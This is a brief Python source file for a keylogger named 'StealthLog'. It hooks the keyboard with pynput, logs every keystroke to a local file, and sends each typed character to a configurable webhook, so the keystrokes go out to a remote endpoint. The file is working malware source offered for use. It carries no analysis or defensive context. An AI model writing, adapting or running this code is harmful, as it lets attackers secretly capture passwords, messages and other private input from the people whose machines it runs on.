import time
from pynput import keyboard
from threading import Thread
import requests
import os

# StealthLog Keylogger, Developed by Deccatron
webhook_url = 'YOUR_WEBHOOK_URL_HERE'

def send_message_to_webhook(message):
    payload = {'content': message}
    requests.post(webhook_url, json=payload)

def on_press(key):
    try:
        key_char = key.char
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'Key pressed: {key_char}\n')
        send_message_to_webhook(f'Key pressed: {key_char}')
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'Special key pressed: {key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        with open("keylog.txt", "a") as log_file:
            log_file.write('Exiting keylogger.\n')
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        with open("keylog.txt", "a") as log_file:
            log_file.write('Keylogger started. Press ESC to stop.\n')
        listener.join()

if __name__ == "__main__":
    keylogger_thread = Thread(target=start_keylogger)

    keylogger_thread.start()
    keylogger_thread.join()
